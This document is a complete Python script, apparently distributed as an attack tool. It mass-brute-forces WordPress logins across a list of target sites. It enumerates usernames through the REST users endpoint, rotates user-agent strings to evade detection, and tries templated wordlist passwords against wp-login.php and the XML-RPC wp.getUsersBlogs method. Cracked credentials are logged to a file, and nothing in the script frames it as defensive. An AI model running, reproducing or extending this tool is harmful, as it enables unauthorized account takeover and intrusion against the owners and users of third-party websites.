#!/usr/bin/python

import requests
import re
import os
import sys
import random
from multiprocessing.dummy import Pool as ThreadPool
from urllib.parse import urlparse
import warnings
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

warnings.simplefilter('ignore', InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
fw = Fore.WHITE
fb = Fore.BLUE
sb = Style.BRIGHT
sn = Style.NORMAL

# List of common user-agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    # Add more user-agents as needed
]

def global_banner():
    return f'''{fg}
[ Coded By '/Mine7 || github.com/InMyMine7 || t.me/InMyMineee ]
'''   

class WPBruteForcer:
    def __init__(self):
        print(global_banner())
        self.targets = []
        self.passwords = []
        self.num_threads = 10
        self.found_usernames = []  

    def load_data(self):
        try:
            target_list = input('[~] ENTER YOUR LIST: ')
            self.targets = [line.strip() for line in open(target_list, 'r').readlines()]
            password_list = 'passwd.txt'
            with open(password_list, 'r') as file:
                self.passwords = [line.strip() for line in file]
            self.num_threads = int(input('[~] ENTER NUMBER OF THREADS: '))
        except (IOError, ValueError) as e:
            print(f"{fr}Error: {e}")
            sys.exit()
        except KeyboardInterrupt:
            print("\nProcess interrupted.")
            sys.exit()

    def url_fix(self, url):
        url = url.rstrip("/")
        return url if url.startswith(("http://", "https://")) else "http://" + url

    def full_password(self, password, username, url):
        return password.replace("[WPLOGIN]", username)\
                       .replace("[UPPERLOGIN]", username.upper())\
                       .replace("[DOMAIN]", urlparse(url).netloc)\
                       .replace("[UPPERDOMAIN]", url.upper())\
                       .replace("[FULLDOMAIN]", url)

    def get_cookies(self, url):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, verify=False, timeout=15)
            if response.status_code == 200:
                cookies = response.cookies.get_dict()
                print(f"[COOKIES] {url} - {cookies}")
                return cookies
            else:
                print(f"[FAILED TO RETRIEVE COOKIES] {url} - Status Code: {response.status_code}")
                return {}
        except requests.exceptions.RequestException as e:
            print(f"[ERROR ON] {url}: {e}")
            return {}

    def get_usernames(self, url):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(f'{url}/wp-json/wp/v2/users', headers=headers, verify=False, timeout=15)
            usernames = re.findall(r'"slug":"(.*?)"', response.text)
            if not usernames:
                print(f"[NO USERNAMES FOUND ON] {url}")
                return []
            print(f"[USERNAMES FOUND ON] {url}: {usernames}")
            self.found_usernames.extend(usernames)  # Save found usernames to the list
            return usernames
        except requests.exceptions.RequestException as e:
            print(f"[ERROR ON] {url}: {e}")
            return []

    def login_wp(self, url, username, password):
        login_url = f"{url}/wp-login.php"
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{url}/wp-admin/',
            'testcookie': '1'
        }
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.post(login_url, data=payload, headers=headers, verify=False, timeout=30)
            if 'dashboard' in response.url or 'logout' in response.text:
                print(f"[SUCCESS] {url} [USERNAME] {username} [PASSWORD] {password}")
                with open('g00d.txt', 'a') as output_file:
                    output_file.write(f'{url}/wp-login.php#{username}@{password}\n')
                return True  # Indicate successful login
            else:
                print(f"[FAILED LOGIN] {url} [USERNAME] {username} [PASSWORD] {password}")
                return False
        except requests.exceptions.ConnectTimeout:
            print(f"[TIMEOUT] {url} - Connection timed out.")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[ERROR ON LOGIN] {url}: {e}")
            return False

    def brute_force(self, url):
        try:
            usernames = self.get_usernames(url)  # Retrieve usernames
            if not usernames:
                return
            for username in self.found_usernames:
                cookies = self.get_cookies(url)
                for password in self.passwords:
                    full_password_attempt = self.full_password(password, username, url)

                    if self.login_wp(url, username, full_password_attempt):
                        return 

                    data = f"""
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{username}</value></param>
                            <param><value>{full_password_attempt}</value></param>
                        </params>
                    </methodCall>
                    """
                    try:
                        response = requests.post(f'{url}/xmlrpc.php', headers={'User-Agent': random.choice(USER_AGENTS)}, data=data, cookies=cookies, timeout=30)
                        if 'blogName' in response.text or '<member><name>isAdmin</name><value>' in response.text:
                            print(f"{sb}{sn}[{fg}SUCCESS{fw}] {url} {fw}[{fg}USERNAME{fw}] {username} {fw}[{fg}PASSWORD{fw}] {full_password_attempt}")
                            with open('g00d.txt', 'a') as output_file:
                                output_file.write(f'{url}/wp-login.php#{username}@{full_password_attempt}\n')
                            return  # Stop if login is successful
                        else:
                            print(f"[FAILED XMLRPC] {url} [USERNAME] {username} [PASSWORD] {full_password_attempt}")
                    except requests.exceptions.ConnectTimeout:
                        print(f"[TIMEOUT] {url} - Connection timed out.")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR ON] {url}: {e}")

    def check_wordpress(self, url):
        try:
            url = self.url_fix(url)
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(f'{url}/wp-login.php', headers=headers, verify=False, timeout=30)
            if 'WordPress' in response.text:
                self.brute_force(url)
                with open('WordPress.txt', 'a') as output_file:
                    output_file.write(url + '\n')
        except requests.exceptions.ConnectTimeout:
            print(f"[TIMEOUT] {url} - Connection timed out.")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR FOR] {url}: {e}")
        except Exception as e:
            print(f"[ERROR ON] {url}: {e}")

    def run(self):
        try:
            with ThreadPool(self.num_threads) as pool:
                pool.map(self.check_wordpress, self.targets)
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            print(f"[ERROR]: {e}")

if __name__ == "__main__":
    clear_console = lambda: os.system('cls' if os.name == 'nt' else 'clear')
    clear_console()
    wp_brute_forcer = WPBruteForcer()
    wp_brute_forcer.load_data()
    wp_brute_forcer.run()
